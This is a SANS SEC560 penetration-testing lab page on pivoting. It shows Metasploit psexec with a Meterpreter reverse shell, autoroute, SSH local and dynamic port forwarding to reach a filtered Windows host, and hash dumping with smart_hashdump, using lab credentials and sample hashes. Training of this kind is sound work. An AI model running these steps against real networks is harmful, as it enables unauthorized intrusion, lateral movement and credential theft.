@@ -1,0 +1,760 @@
+<!DOCTYPE HTML>
+<!--
+    Editorial by HTML5 UP
+    html5up.net | @ajlkn
+    Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
+
+    560 Wiki made with love and care by the following people:
+    - Tim Medin (@TimMedin, @RedSiegeInfoSec) -- Project Lead, Red Siege Information Security
+    - Erik Van Buggenhout (@@ErikVaBu, @NVISOsecurity) -- Project Lead, NVISO Security
+    - Mick Douglas (@BetterSafetyNet) -- Tech lead, Intern Wrangler, InfoSec Innovations
+        - Yulli Chong -- Intern, InfoSec Innovations
+        - Aaron Sawyer (@CrashingStatic) -- Intern, InfoSec Innovations
+-->
+<html>
+    <head>
+        <title>SANS SEC560 Lab Wiki</title>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+        <link rel="stylesheet" href="css/main.css" />
+    </head>
+    <body>
+
+        <!-- Wrapper -->
+            <div id="wrapper">
+
+                <!-- Main -->
+                    <div id="main">
+                        <div class="inner">
+
+                            <!-- Header -->
+                                <header id="header">
+                                    <a href="index.html" class="logo">SANS SEC 560 Lab Wiki</a>
+                                    <ul class="icons">
+                                        <li><a href="https://twitter.com/search?q=Sec560" class="icon fa-twitter"><span class="label">Twitter</span></a></li>
+                                    </ul>
+                                </header>
+
+                            <!-- Content -->
+                            <!-- Converted Markdown body (AKA HTML stubs) goes here -->
+<h1 id="lab-43-msf-pivots">Lab 4.3: MSF Pivots</h1>
+<h2 id="objectives">Objectives</h2>
+<p>In this lab, we'll pivot in three different ways.</p>
+<ol>
+<li><p>We'll establish a Metepreter session on the 10.10.10.10 system and then use that session to pivot to the 10.10.10.20 system.</p></li>
+<li><p>We'll SSH into the 10.10.10.50 system and then use an SSH local port forward to access 10.10.10.20.</p></li>
+<li><p>Same as #2, but we'll use a dynamic port forward instead.</p></li>
+</ol>
+<p>In each of the scenarios, we'll use a previously compromised system to access the 10.10.10.20 system.</p>
+<h2 id="lab-setup">Lab Setup</h2>
+<p>Ensure that you can ping <code>10.10.10.10</code> in the 560 target environment from your Slingshot Linux image.</p>
+<pre>
+$ <b>ping 10.10.10.10</b>
+</pre>
+
+<p>Let's check which systems are listening and accessible on TCP port 445 by running the nmap command below:</p>
+<pre>
+$ <b>nmap -p 445 10.10.10.10 10.10.10.20</b>
+</pre>
+
+<pre>
+$ <b>nmap -p 445 10.10.10.10 10.10.10.20</b>
+
+Starting Nmap 7.60 ( https://nmap.org )
+Nmap scan report for 10.10.10.10
+Host is up (0.00043s latency).
+
+PORT    STATE SERVICE
+445/tcp <em>open</em>  microsoft-ds
+
+Nmap scan report for 10.10.10.20
+Host is up (0.00066s latency).
+
+PORT    STATE    SERVICE
+445/tcp <em>filtered</em> microsoft-ds
+</pre>
+
+<p>You can see that we can't access TCP port 445 on 10.10.10.20.</p>
+<h2 id="lab--step-by-step-instructions">Lab &ndash; Step-by-Step Instructions</h2>
+<h4 id="part-1-pivoting-through-an-existing-meterpreter-session">Part 1: Pivoting through an existing Meterpreter session.</h4>
+<p>Earlier, we saw how <code>psexec</code> can grab hashes from a target Windows machine. Let&rsquo;s try another approach, still with the same goal of retrieving the hashes from our target, but this time by sending our SMB through some pivots. We are going to use Metasploit&rsquo;s <code>psexec</code> module to launch our attack over SMB, getting the Meterpreter to run on the target so that we can use it to dump hashes.</p>
+<p><img  class="myImg"  src="pics/Ex4.3_img01.png" style="width:100%;max-width:600px"  alt="Metasploit Route to Access 10.10.10.20" /></p>
+<p>First, let's start Metasploit:</p>
+<pre>
+$ <b>msfconsole</b>
+</pre>
+
+<p>We'll then set up Metasploit like we did in the previous exercises.</p>
+<pre>
+sec560@slingshot:~$ <b>msfconsole</b>
+
+# cowsay++
+ ____________
+< metasploit >
+ ------------
+       \   ,__,
+        \  (oo)____
+           (__)    )\
+              ||--|| *
+
+
+       =[ metasploit v5.0.34-dev-58e36b6                  ]
++ -- --=[ 1902 exploits - 1072 auxiliary - 329 post       ]
++ -- --=[ 550 payloads - 44 encoders - 10 nops            ]
++ -- --=[ 2 evasion                                       ]
+
+msf5 > <b>use exploit/windows/smb/psexec</b>
+msf5 exploit(windows/smb/psexec) > <b>set PAYLOAD windows/meterpreter/reverse_tcp</b>
+PAYLOAD => windows/meterpreter/reverse_tcp
+msf5 exploit(windows/smb/psexec) > <b>set RHOSTS 10.10.10.10</b>
+RHOSTS => 10.10.10.10
+msf5 exploit(windows/smb/psexec) > <b>set LHOST <i>YOUR_LINUX_IP_ADDRESS</i></b>
+LHOST => 10.10.75.102
+msf5 exploit(windows/smb/psexec) > <b>set SMBUSER administrator</b>
+SMBUSER => administrator
+msf5 exploit(windows/smb/psexec) > <b>set SMBPASS sansnight</b>
+SMBPASS => sansnight
+</pre>
+
+<p>Confirm your settings by running <code>show options</code>:</p>
+<pre>
+msf5 exploit(windows/smb/psexec) > <b>show options</b>
+
+Module options (exploit/windows/smb/psexec):
+
+   Name                  Current Setting  Required  Description
+   ----                  ---------------  --------  -----------
+   RHOSTS                <em>10.10.10.10</em>      yes       The target address range or
+                                                    CIDR identifier
+   RPORT                 445              yes       The SMB service port (TCP)
+   SERVICE_DESCRIPTION                    no        Service description to to 
+                                                    be used on target for 
+                                                    pretty listing
+   SERVICE_DISPLAY_NAME                   no        The service display name
+   SERVICE_NAME                           no        The service name
+   SHARE                 ADMIN$           yes       The share to connect to, 
+                                                    can be an admin share 
+                                                    (ADMIN$,C$,...) or a 
+                                                    normal read/write folder 
+                                                    share
+   SMBDomain             .                no        The Windows domain to use for authentication
+   SMBPass               <em>sansnight</em>        no        The password for the specified username
+   SMBUser               <em>administrator</em>    no        The username to authenticate as
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, 
+                                        thread, process, none)
+   LHOST     <em>10.10.75.102</em>     yes       The listen address (an interface 
+                                        may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+</pre>
+
+<p>The IP address you use with <code>LHOST</code> will be different than the output above.</p>
+<p>Now let's run <code>exploit</code>:</p>
+<pre>
+msf5 exploit(windows/smb/psexec) > <b>exploit</b>
+
+[*] Started reverse TCP handler on 10.10.75.102:4444
+[*] 10.10.10.10:445 - Connecting to the server...
+[*] 10.10.10.10:445 - Authenticating to 10.10.10.10:445 as user 'administrator'...
+[*] 10.10.10.10:445 - Selecting PowerShell target
+[*] 10.10.10.10:445 - Executing the payload...
+[+] 10.10.10.10:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (179779 bytes) to 10.10.10.10
+[*] <em>Meterpreter session 1</em> opened (10.10.75.102:4444 -> 10.10.10.10:49857)
+
+meterpreter >
+</pre>
+
+<p>To set up the pivot, we'll use the <code>post/multi/manage/autoroute</code> module. Type the following command to look at this module:</p>
+<pre>
+meterpreter > <b>info post/multi/manage/autoroute</b>
+</pre>
+
+<p>You'll see output like this:</p>
+<pre>
+meterpreter > <b>info post/multi/manage/autoroute</b>
+
+       Name: Multi Manage Network Route via Meterpreter Session
+     Module: post/multi/manage/autoroute
+   Platform:
+       Arch:
+       Rank: Normal
+
+... truncated for brevity ...
+
+Description:
+  This module manages session routing via an existing Meterpreter
+  session. It enables other modules to 'pivot' through a compromised
+  host when connecting to the named NETWORK and SUBMASK. Autoadd will
+  search a session for valid subnets from the routing table and
+  interface list then add routes to them. Default will add a default
+  route so that all TCP/IP traffic not specified in the MSF routing
+  table will be routed through the session when pivoting. See
+  documentation for more 'info -d' and click 'Knowledge Base'
+
+
+Module options (post/multi/manage/autoroute):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CMD      autoadd          yes       Specify the autoroute command (Accepted:
+                                       add, autoadd, print, delete, default)
+   NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
+   SESSION                   yes       The session to run this module on.
+   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)
+</pre>
+
+<p>If we omit these options, the module will automatically add routes based on the target's routing table. We will specify a smaller network (<code>SUBNET</code>) and we'll specify the <code>CMD</code> to do <code>ADD</code> instead of <code>autoadd</code>. If we use the default <code>CMD</code> of <code>autoadd</code>, our other options will be ignored.</p>
+<blockquote>
+<p>Note: Do NOT use <code>CMD=autoadd</code> in this lab! It will not work because your host and the target system are on the same /16 subnet and Meterpreter will not call back correctly.</p>
+</blockquote>
+<p>Run the command below to establish the route:</p>
+<pre>
+meterpreter > <b>run post/multi/manage/autoroute SUBNET=10.10.10.0 CMD=add</b>
+
+[!] SESSION may not be compatible with this module.
+[*] Running module against TRINITY
+[*] Adding a route to 10.10.10.0/255.255.255.0...
+<em>[+] Route added to subnet 10.10.10.0/255.255.255.0.</em>
+meterpreter >
+</pre>
+
+<blockquote>
+<p>You'll see a warning that the session may not be compatible, but it will work fine.</p>
+</blockquote>
+<p>Let's confirm the route is in place by backgrounding our Meterpreter session and then looking at the route table.</p>
+<pre>
+meterpreter > <b>background</b>
+[*] Backgrounding session <em>1</em>...
+msf5 exploit(windows/smb/psexec) > <b>route print</b>
+
+IPv4 Active Routing Table
+=========================
+
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   <em>10.10.10.0         255.255.255.0      Session 1</em>
+
+[*] There are currently no IPv6 routes defined.
+msf5 exploit(windows/smb/psexec) >
+</pre>
+
+<blockquote>
+<p>Note: Your session number may be different.</p>
+</blockquote>
+<p>Now we need to modify our existing <code>psexec</code> to target <code>10.10.10.20</code>.</p>
+<pre>
+msf5 exploit(windows/smb/psexec) > <b>set RHOST 10.10.10.20</b>
+RHOST => 10.10.10.20
+</pre>
+
+<p>Let's confirm our settings by looking at the options:</p>
+<pre>
+msf5 exploit(windows/smb/psexec) > <b>show options</b>
+
+Module options (exploit/windows/smb/psexec):
+
+   Name                  Current Setting  Required  Description
+   ----                  ---------------  --------  -----------
+   RHOSTS                <em>10.10.10.20</em>      yes       The target address range or
+                                                    CIDR identifier
+   RPORT                 445              yes       The SMB service port (TCP)
+   SERVICE_DESCRIPTION                    no        Service description to to 
+                                                    be used on target for 
+                                                    pretty listing
+   SERVICE_DISPLAY_NAME                   no        The service display name
+   SERVICE_NAME                           no        The service name
+   SHARE                 ADMIN$           yes       The share to connect to, 
+                                                    can be an admin share 
+                                                    (ADMIN$,C$,...) or a 
+                                                    normal read/write folder 
+                                                    share
+   SMBDomain             .                no        The Windows domain to use for authentication
+   SMBPass               <em>sansnight</em>        no        The password for the specified username
+   SMBUser               <em>administrator</em>    no        The username to authenticate as
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+                                        thread, process, none)
+   LHOST     <em>10.10.75.102</em>     yes       The listen address (an interface 
+                                        may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+</pre>
+
+<blockquote>
+<p>Note: Your <code>LHOST</code> IP address should be that of your Linux system.</p>
+</blockquote>
+<p>Let's launch our exploit:</p>
+<pre>
+msf5 exploit(windows/smb/psexec) > <b>exploit</b>
+
+[*] Started reverse TCP handler on 10.10.75.102:6789
+[*] 10.10.10.20:445 - Connecting to the server...
+[*] 10.10.10.20:445 - Authenticating to 10.10.10.20:445 as user 'administrator'...
+[*] 10.10.10.20:445 - Selecting PowerShell target
+[*] 10.10.10.20:445 - Executing the payload...
+[+] 10.10.10.20:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (179779 bytes) to 10.10.10.20
+<em>[*] Meterpreter session 2</em> opened (10.10.75.102:6789 -> 10.10.10.20:49664)
+
+meterpreter >
+</pre>
+
+<p>We can confirm we are on the new system by running <code>sysinfo</code> and <code>ipconfig</code>:</p>
+<pre>
+meterpreter > <b>sysinfo</b>
+<em>Computer        : MORPHEUS</em>
+OS              : Windows 2012 R2 (Build 9600).
+Architecture    : x64
+System Language : en_US
+Domain          : SEC560
+Logged On Users : 5
+Meterpreter     : x86/windows
+meterpreter > <b>ipconfig</b>
+
+... truncated for brevity ...
+
+Interface 12
+============
+Name         : Intel(R) 82574L Gigabit Network Connection
+Hardware MAC : 00:0c:29:1b:1d:15
+MTU          : 1500
+<em>IPv4 Address : 10.10.10.20</em>
+IPv4 Netmask : 255.255.0.0
+
+... truncated for brevity ...
+
+meterpreter >
+</pre>
+
+<p>We can then perform any actions we like on this target system, including dumping hashes:</p>
+<pre>
+meterpreter > <b>run post/windows/gather/smart_hashdump</b>
+
+[*] Running module against MORPHEUS
+[*] Hashes will be saved to the database if one is connected.
+[+] Hashes will be saved in loot in JtR password file format to:
+[*] /home/sec560/.msf4/loot/20190707214747_default_10.10.10.20_windows.hashes_511095.txt
+[*] Dumping password hashes...
+[*] Running as SYSTEM extracting hashes from registry
+[*]     Obtaining the boot key...
+[*]     Calculating the hboot key using SYSKEY 483ab4e0518d8e0a7a80c5220a07a6d4...
+[*]     Obtaining the user list and keys...
+[*]     Decrypting user keys...
+<em>[*]     Dumping password hints...
+[+]     Falken:" "
+[+]     Mike:" "
+[+]     Monk:" "
+[+]     Skodo:" "
+[+]     Susan:" "
+[+]     George:" "
+[*]     Dumping password hashes...
+[+]     Administrator:500:4be2829baf305d82f3e07e41f962af91:dcf43450e79b44919d6d4358b7871541:::
+[+]     Mike:1002:bb2493b09f6ecfc9aad3b435b51404ee:c0bb120391d5367712cc4c92389bfa21:::
+[+]     Monk:1003:af83dbf0052ee4717584248b8d2c9f9e:a65c3da63fdb6ca22c172b13169d62a5:::
+[+]     Skodo:1004:33d58472247e80dbaad3b435b51404ee:5a7cae5bd6f7d3f44d4a82ed9ecd1720:::
+[+]     Susan:1005:e52cac67419a9a2236077a718ccdf409:5f946a12c3ebe8640c7c382616045332:::
+[+]     George:1006:8ece4a2d07417e32aad3b435b51404ee:f9a2d4b1ede1eca53a56356d77fd7b45:::</em>
+</pre>
+
+<p>We just used an existing Meterpreter session as a pivot to exploit another system!</p>
+<p>Now let's do the same thing, but a different way; next up, SSH Port Forwarding.</p>
+<h4 id="part-2-pivoting-with-ssh-local-port-forwarding">Part 2: Pivoting with SSH Local Port Forwarding</h4>
+<p>Let&rsquo;s try another approach, still with the same goal of retrieving the hashes from our target, but this time by sending our SMB through a Linux host. In particular, we&rsquo;ll deploy the Meterpreter through an SSH port forward 10.10.10.50 system. Let's hop through SSH.</p>
+<p><img  class="myImg"  src="pics/Ex4.3_img02.png" style="width:100%;max-width:600px"  alt="MSF through SSH Tunnel to Access 10.10.10.20" /></p>
+<p>First, let's kill all our Meterpreter sessions.</p>
+<p>If you are in a <code>meterpreter &gt;</code> prompt, type <code>exit</code>:</p>
+<pre>
+meterpreter > <b>exit</b>
+[*] Shutting down Meterpreter...
+
+[*] 10.10.10.20 - Meterpreter session 2 closed. Reason: User exit
+msf5 exploit(windows/smb/psexec) >
+</pre>
+
+<p>Then let's kill all our existing sessions with the <code>-K</code> (capital K) option:</p>
+<pre>
+msf5 exploit(windows/smb/psexec) > <b>sessions -K</b>
+[*] Killing all sessions...
+msf5 exploit(windows/smb/psexec) >
+</pre>
+
+<p>Now let's set up our SSH tunnel.</p>
+<p><b>Open a new terminal window for the next step!</b></p>
+<p>To set up the SSH port forward, we are going to run the command below in the new terminal window. Use the password <code>joshua</code>.</p>
+<pre>
+sec560@slingshot:~$ <b>ssh -L 7777:10.10.10.20:445 falken@10.10.10.50</b>
+</pre>
+
+<p>Your output will look similar to this:</p>
+<pre>
+sec560@slingshot:~$ <b>ssh -L 7777:10.10.10.20:445 falken@10.10.10.50</b>
+The authenticity of host '10.10.10.50 (10.10.10.50)' can't be established.
+ECDSA key fingerprint is SHA256:kdi7QI2MAwfD/AjP6laCwnA/3OgMt3vacPIviAjaTKw.
+Are you sure you want to continue connecting (yes/no)? <b>yes</b>
+
+falken@10.10.10.50's password: <b><i>joshua</b></i>
+
+... output truncated for brevity ...
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Could not chdir to home directory /home/falken: No such file or directory
+$
+</pre>
+
+<blockquote>
+<p>Note: you may be prompted to accept the key fingerprint; if so, type <code>yes</code>. If you are not prompted, you have already accepted the key once.</p>
+</blockquote>
+<p>The above command will connect to 10.10.10.50 as <code>falken</code>. The <code>falken</code> user is not a privileged account on the Linux system, which makes this attack even more fantastic. The <code>-L</code> option will create a local port forward. TCP port <code>7777</code> will be a listener on our Linux host. The traffic will go through the SSH tunnel and then connect from 10.10.10.50 to 10.10.10.20 on TCP port 445.</p>
+<p>Switch back to Metasploit and confirm you have these options set:</p>
+<pre>
+msf5 > use exploit/windows/smb/psexec
+msf5 exploit(windows/smb/psexec) > <b>set PAYLOAD windows/meterpreter/reverse_tcp</b>
+PAYLOAD => windows/meterpreter/reverse_tcp
+msf5 exploit(windows/smb/psexec) > <b>set LHOST <i>YOUR_LINUX_IP_ADDRESS</i></b>
+LHOST => 10.10.75.102
+msf5 exploit(windows/smb/psexec) > <b>set SMBUSER administrator</b>
+SMBUSER => administrator
+msf5 exploit(windows/smb/psexec) > <b>set SMBPASS sansnight</b>
+SMBPASS => sansnight
+</pre>
+
+<p>When we set our target, remember we need to target ourselves so we can to through the forwarded port.</p>
+<pre>
+msf5 exploit(windows/smb/psexec) > <b>set RHOST 127.0.0.1</b>
+RHOST => 127.0.0.1
+msf5 exploit(windows/smb/psexec) > <b>set RPORT 7777</b>
+LPORT => 7777
+</pre>
+
+<p>Let's confirm our settings by running <code>show options</code>:</p>
+<pre>
+msf5 exploit(windows/smb/psexec) > <b>show options</b>
+
+Module options (exploit/windows/smb/psexec):
+
+   Name                  Current Setting  Required  Description
+   ----                  ---------------  --------  -----------
+   RHOSTS                <em>127.0.0.1</em>        yes       The target address range or
+                                                    CIDR identifier
+   RPORT                 <em>7777</em>             yes       The SMB service port (TCP)
+   SERVICE_DESCRIPTION                    no        Service description to to 
+                                                    be used on target for 
+                                                    pretty listing
+   SERVICE_DISPLAY_NAME                   no        The service display name
+   SERVICE_NAME                           no        The service name
+   SHARE                 ADMIN$           yes       The share to connect to, 
+                                                    can be an admin share 
+                                                    (ADMIN$,C$,...) or a 
+                                                    normal read/write folder 
+                                                    share
+   SMBDomain             .                no        The Windows domain to use for authentication
+   SMBPass               <em>sansnight</em>        no        The password for the specified username
+   SMBUser               <em>administrator</em>    no        The username to authenticate as
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, 
+                                        thread, process, none)
+   LHOST     <em>10.10.75.102</em>     yes       The listen address (an interface 
+                                        may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+</pre>
+
+<p>Now launch the <code>exploit</code>:</p>
+<pre>
+msf5 exploit(windows/smb/psexec) > <b>exploit</b>
+
+[*] Started reverse TCP handler on 10.10.75.102:4444
+[*] <em>127.0.0.1:7777</em> - Connecting to the server...
+[*] 127.0.0.1:7777 - Authenticating to 127.0.0.1:7777 as user 'administrator'...
+[*] 127.0.0.1:7777 - Selecting PowerShell target
+[*] 127.0.0.1:7777 - Executing the payload...
+[+] 127.0.0.1:7777 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (179779 bytes) to 10.10.10.20
+[*] Meterpreter session 3 opened (10.10.75.102:4444 -> 10.10.10.20:49689)
+
+meterpreter >
+</pre>
+
+<p>You'll notice that the session connected through our host (<code>127.0.0.1</code>) on TCP port <code>7777</code>. The SSH port forwarder is listening on port <code>7777</code> and will forward the traffic through the SSH tunnel to the Linux host (10.10.10.50). Since 10.10.10.50 can access 10.10.10.20 on TCP port 445, the payload delivery is successful!</p>
+<p>If you like, you can dump the password hashes once again:</p>
+<pre>
+meterpreter > <b>run post/windows/gather/smart_hashdump</b>
+</pre>
+
+<p>SSH is very powerful! The port forwarding feature is a nice way to bend around firewalls. The problem with our current setup is that we have to set up a local port forward for every host/port combination. SSH has an even better way and we will use that method next.</p>
+<h4 id="part-3-pivoting-with-ssh-dynamic-port-forwarding">Part 3: Pivoting with SSH Dynamic Port Forwarding</h4>
+<p>Let's kill our Meterpeter session once again.</p>
+<pre>
+meterpreter > <b>exit</b>
+[*] Shutting down Meterpreter...
+
+[*] 127.0.0.1 - <em>Meterpreter session 3 closed. Reason: User exit</em>
+msf5 exploit(windows/smb/psexec) >
+</pre>
+
+<p>We need to change our SSH connection, so let's exit the existing SSH session.</p>
+<pre>
+$ <b>exit</b>
+Connection to 10.10.10.50 closed.
+sec560@slingshot:~$
+</pre>
+
+<p>Our new SSH session will use the <code>-D</code> option to Dynamically forward ports. Launch the new SSH session by running the following command from the other terminal window:</p>
+<pre>
+sec560@slingshot:~$ <b>ssh -D 9999 falken@10.10.10.50</b>
+falken@10.10.10.50's password: <b><i>joshua</b></i>
+... output truncated for brevity ...
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Could not chdir to home directory /home/falken: No such file or directory
+$
+</pre>
+
+<p>In Metasploit, let's change our targeting information back to the original settings targeting <code>10.10.10.20</code> on TCP port <code>445</code>:</p>
+<pre>
+msf5 exploit(windows/smb/psexec) > <b>set RHOST 10.10.10.20</b>
+RHOST => 10.10.10.20
+msf5 exploit(windows/smb/psexec) > <b>set RPORT 445</b>
+RPORT => 445
+</pre>
+
+<p>Once again, let's confirm our settings by running <code>show options</code>:</p>
+<pre>
+msf5 exploit(windows/smb/psexec) > <b>show options</b>
+
+Module options (exploit/windows/smb/psexec):
+
+   Name                  Current Setting  Required  Description
+   ----                  ---------------  --------  -----------
+   RHOSTS                <em>10.10.10.20</em>      yes       The target address range or
+                                                    CIDR identifier
+   RPORT                 <em>445</em>              yes       The SMB service port (TCP)
+   SERVICE_DESCRIPTION                    no        Service description to to 
+                                                    be used on target for 
+                                                    pretty listing
+   SERVICE_DISPLAY_NAME                   no        The service display name
+   SERVICE_NAME                           no        The service name
+   SHARE                 ADMIN$           yes       The share to connect to, 
+                                                    can be an admin share 
+                                                    (ADMIN$,C$,...) or a 
+                                                    normal read/write folder 
+                                                    share
+   SMBDomain             .                no        The Windows domain to use for authentication
+   SMBPass               <em>sansnight</em>        no        The password for the specified username
+   SMBUser               <em>administrator</em>    no        The username to authenticate as
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, 
+                                        thread, process, none)
+   LHOST     <em>10.10.75.102</em>     yes       The listen address (an interface 
+                                        may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+</pre>
+
+<p>To make Metasploit use the SSH Dynamic Port forward, we need to configure it to use the <code>set Proxies</code> command, as shown below:</p>
+<pre>
+msf5 exploit(windows/smb/psexec) > <b>set Proxies socks4:127.0.0.1:9999</b>
+Proxies => socks4:127.0.0.1:9999
+msf5 exploit(windows/smb/psexec) > <b>set ReverseAllowProxy true</b>
+ReverseAllowProxy => true
+</pre>
+
+<p>The <code>set ReverseAllowProxy true</code> command tells Metasploit that the reverse connection will be outside of the proxy.</p>
+<p>Now run the <code>exploit</code>:</p>
+<pre>
+msf5 exploit(windows/smb/psexec) > exploit
+
+[*] Started reverse TCP handler on 10.10.75.102:4444
+[*] 10.10.10.20:445 - Connecting to the server...
+[*] 10.10.10.20:445 - Authenticating to 10.10.10.20:445 as user 'administrator'...
+[*] 10.10.10.20:445 - Selecting PowerShell target
+[*] 10.10.10.20:445 - Executing the payload...
+[+] 10.10.10.20:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (179779 bytes) to 10.10.10.20
+[*] <em>Meterpreter session 4</em> opened (10.10.75.102:4444 -> 10.10.10.20:49714)
+
+meterpreter >
+</pre>
+
+<p>The beauty of this method is that we don't have to set up multiple local port forwards using the <code>-L</code> option; we can set it once and then hit multiple machines.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>In this lab, we&rsquo;ve seen how we can deploy the Meterpreter through different tunneling mechanisms. We can use an existing Meterpreter session to use one Windows host to access another. Alternatively, we can harness the power of SSH to hop through a Linux system to access a Windows host. No matter how you do it, you can use these techniques to access ports and hosts that are inaccessible from your attacking system.</p>
+
+                        </div>
+                    </div>
+
+                <!-- Sidebar -->
+                    <div id="sidebar">
+                        <div class="inner">
+
+                            <!-- Search -->
+                            <!-- MBD 20180705 - Search feature is disabled for now.  Will enable it once we get OK
+                                <input type="text" name="query" id="query" placeholder="Search" />
+                                    <button onclick="myFunction()">?</button>
+                                        <script>
+                                        function myFunction() {
+                                                var x = document.getElementById("query").value;
+                                               var res =  idx.search(x);
+                                            alert(res);
+                                       </script>
+                            -->
+
+                            <!-- Menu -->
+                                <nav id="menu">
+                                    <header class="major">
+                                        <h2>Menu</h2>
+                                    </header>
+                                    <ul>
+                                        <li><a href="index.html">Homepage</a></li>
+                                        <li><a href="Getting-Started.html">Getting Started</a></li>
+                                        <li>
+                                            <span class="opener">Book 1:</span>
+                                            <ul>
+                                                <li><a href="Lab-1.1-Setting-Up-The-Image.html">Setting Up The Image</a></li>
+                                                <li><a href="Lab-1.2-Scope-and-RoE-Role-Play.html">Scope and RoE Role Play</a></li>
+                                                <li><a href="Lab-1.3-Metadata-Treasure-Hunt.html">Metadata Treasure Hunt</a></li>
+                                                <li><a href="Lab-1.4-Recon-ng-for-DNS-Analysis.html">Recon-ng for DNS Analysis</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 2:</span>
+                                            <ul>
+                                            	<li><a href="Lab-2.1-Nmap.html">Nmap</a></li>
+                                            	<li><a href="Lab-2.2-Nmap-O-sV.html">Nmap -O -sV</a></li>
+                                                <li><a href="Lab-2.3-NSE.html">NSE</a></li>
+                                                <li><a href="Lab-2.4-Nessus.html">Nessus</a></li>
+                                                <li><a href="Lab-2.5-Netcat.html">Netcat</a></li>
+                                                <li><a href="Lab-2.6-PowerShell.html">PowerShell</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 3:</span>
+                                            <ul>
+                                                <li><a href="Lab-3.1-Metasploit.html">Metasploit</a></li>
+                                                <li><a href="Lab-3.2-Meterpreter.html">Meterpreter</a></li>
+                                                <li><a href="Lab-3.3-Veil.html">Veil</a></li>
+                                                <li><a href="Lab-3.4-Port-Pivot-Relays.html">Port Pivot Relays</a></li>
+                                                <li><a href="Lab-3.5-Empire.html">Empire</a></li>
+                                                <li><a href="Lab-3.6-Running-Commands-with-sc-and-WMIC.html">Running Commands with sc and WMIC</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 4:</span>
+                                            <ul>
+                                                <li><a href="Lab-4.1-Hydra-Password-Guessing.html">Hydra Password Guessing</a></li>
+                                                <li><a href="Lab-4.2-MSF-psexec-hashdump-kiwi.html">MSF psexec, hash dumping, and Kiwi</a></li>
+                                                <li><a href="Lab-4.3-MSF-pivots.html">MSF Pivots</a></li>
+                                                <li><a href="Lab-4.4-Cracking-with-JtR-and-Hashcat.html">Cracking with John the Ripper and Hashcat</a></li>
+                                                <li><a href="Lab-4.5-Sniffing-Cracking.html">Sniffing & Cracking</a></li>
+                                                <li><a href="Lab-4.6-Pass-the-Hash.html">Pash the Hash</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 5:</span>
+                                            <ul>
+                                                <li><a href="Lab-5.1-Kerberos.html">Kerberos</a></li>
+                                                <li><a href="Lab-5.2-Responder.html">Responder</a></li>
+                                                <li><a href="Lab-5.3-Bloodhound.html">Bloodhound</a></li>
+                                                <li><a href="Lab-5.4-Privilege-Escalation.html">Privilege Escalation</a></li>
+                                                <li><a href="Lab-5.5-Domain-Dominance.html">Domain Dominance</a></li>
+                                                <li><a href="Lab-5.6-ZAP-Proxy.html">ZAP Proxy</a></li>
+                                                <li><a href="Lab-5.7-Command-Injection.html">Command Injection</a></li>
+                                                <li><a href="Lab-5.8-SQL-Injection.html">SQL Injection</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 6:</span>
+                                            <ul>
+                                                <li><a href="Lab-6.1a-Connecting-to-the-Network.html">Connecting to the Network</a></li>
+                                                <li><a href="Lab-6.1b-Online-CTF-Access.html">Online CTF Access</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Cheatsheets</span>
+                                            <ul>
+                                                <li><a href="other/MetsploitCheatsheet.pdf">Metasploit</a></li>
+                                                <li><a href="other/NetcatCheatSheetV1.pdf">Netcat</a></li>
+                                                <li><a href="other/WindowsCommandLineSheetV1.pdf">Windows Command Line</a></li>
+                                            </ul>
+                                        </li>
+                                    </ul>
+                                </nav>
+
+
+
+                            <!-- Footer -->
+                                <footer id="footer">
+                                    <p class="copyright">&copy; Tim Medin<br>
+                                        All rights reserved. <br>
+                                        Design: <a href="https://html5up.net">HTML5 UP</a>.</p>
+                                </footer>
+
+                        </div>
+                    </div>
+
+            </div>
+
+            <!-- The Modal -->
+            <div id="myModal" class="modal">
+                <span class="close">&times;</span>
+                <img class="modal-content" id="img01">
+                <div id="caption"></div>
+            </div>
+
+        <!-- Scripts -->
+            <script src="js/jquery.min.js"></script>
+            <script src="js/skel.min.js"></script>
+            <script src="js/util.js"></script>
+            <script src="js/main.js"></script>
+
+    </body>
+</html>
